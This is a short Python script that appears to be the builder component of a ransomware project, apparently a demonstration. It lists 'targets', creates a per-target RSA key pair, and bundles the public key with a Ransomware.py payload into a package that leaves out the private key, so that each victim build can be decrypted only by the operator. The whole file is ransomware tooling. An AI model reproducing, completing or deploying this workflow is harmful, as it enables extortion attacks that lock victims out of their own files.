import Crypto, ast, os, sys, glob, socket, random, struct
from Crypto.PublicKey import RSA
from Crypto import Random
from os.path import expanduser
from GenAsymKeys import GenAsymKeys
from shutil import copyfile

print("\nCURRENT LIST OF TARGETS:\n")
home = expanduser('~')
targets = glob.glob(home + '/Ransomware/Targets/*')
for path in targets:
    print(path)

name = raw_input("\nName of the new target?: ")
file_path = home + '/Ransomware/Targets/' + name

GenAsymKeys(file_path,name)

#getting the public key that was generated for this target
f = open (file_path + "/publicKey.txt", 'r')
#print(f.read())
key = RSA.importKey(f.read())
f.close()
key_str = key.exportKey('PEM')

#new directory so ransomware to be packaged without private key
rw_dir = file_path + '/RWPackage'
if not os.path.exists(rw_dir):
    os.makedirs(rw_dir)

copyfile(file_path + '/publicKey.txt', rw_dir + '/publicKey.txt')
copyfile(home + '/TechDemo/Ransomware.py', rw_dir + '/Ransomware.py')
